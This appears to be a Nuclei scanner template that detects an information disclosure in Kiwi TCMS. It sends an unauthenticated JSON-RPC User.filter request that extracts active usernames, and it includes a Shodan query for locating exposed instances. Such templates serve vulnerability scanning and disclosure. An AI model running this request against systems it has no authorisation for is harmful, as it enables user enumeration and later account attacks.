http:
- extractors:
  - json:
    - .result[].username
    part: body
    type: json
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - result
    - username
    - jsonrpc
    - is_active
  matchers-condition: and
  raw:
  - 'POST /json-rpc/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Accept-Encoding: gzip, deflate


    {"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}

    '
id: kiwitcms-json-rpc
info:
  author: act1on3
  classification:
    cpe: cpe:2.3:a:kiwitcms:kiwi_tcms:*:*:*:*:*:*:*:*
  description: Internal info exposed in Kiwi TCMS.
  metadata:
    max-request: 1
    product: kiwi_tcms
    shodan-query: title:"Kiwi TCMS - Login" http.favicon.hash:-1909533337
    vendor: kiwitcms
  name: Kiwi TCMS Information Disclosure
  reference:
  - https://hackerone.com/reports/968402
  - https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/
  - https://github.com/act1on3/nuclei-templates/blob/master/vulnerabilities/kiwi-information-disclosure.yaml
  severity: high
  tags: kiwitcms,exposure,misconfig,hackerone,vuln
